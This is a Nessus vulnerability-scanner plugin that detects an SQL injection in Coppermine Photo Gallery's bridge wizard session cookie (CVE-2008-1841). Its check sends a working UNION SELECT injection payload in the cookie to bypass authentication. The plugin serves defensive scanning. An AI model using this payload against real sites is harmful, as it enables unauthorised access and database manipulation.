#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(31859);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2008-1841");
  script_bugtraq_id(28767);
  script_xref(name:"OSVDB", value:"44341");
  script_xref(name:"Secunia", value:"29741");

  script_name(english:"Coppermine Photo Gallery bridge/coppermine.inc.php Bridge Wizard Session Cookie SQL Injection");
  script_summary(english:"Tries to bypass authentication");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of Coppermine installed on the remote host fails to
sanitize user-supplied input to the bridge wizard session cookie
before using it in a database query in 'bridge/coppermine.inc.php'. 
Regardless of PHP's 'magic_quotes_gpc' setting, an attacker may be
able to exploit this issue to manipulate database queries, leading to
disclosure of sensitive information, bypassing authentication, or
attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://forum.coppermine-gallery.net/index.php/topic,51882.0.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Coppermine 1.4.18 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("coppermine_gallery_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/coppermine_photo_gallery"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];
  url = string(dir, "/bridgemgr.php");

  clear_cookiejar();
  # Determine the cookie name.
  r = http_send_recv3(method: 'GET', item:url, port:port);
  if (isnull(r)) exit(0);

  cookie = NULL;

  cookies = get_http_cookies_names();
  # Try to exploit the vulnerability to bypass authentication.
  if (isnull(cookies) || max_index(cookies) == 0)
  {
      debug_print("couldn't find the session cookie!");
  }
  else
  {
    cookie = cookies[0];	# Should I overwrite all cookies?
    exploit = string(SCRIPT_NAME, '") UNION SELECT 1--');
    set_http_cookie(name: cookie, value: urlencode(str:exploit));
    r = http_send_recv3(method: 'GET', port: port, item: url);
    if (isnull(r)) exit(0);

    # There's a problem if we appear to be logged in.
    if ('logout.php?referer=bridgemgr.php"' >< r[2])
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
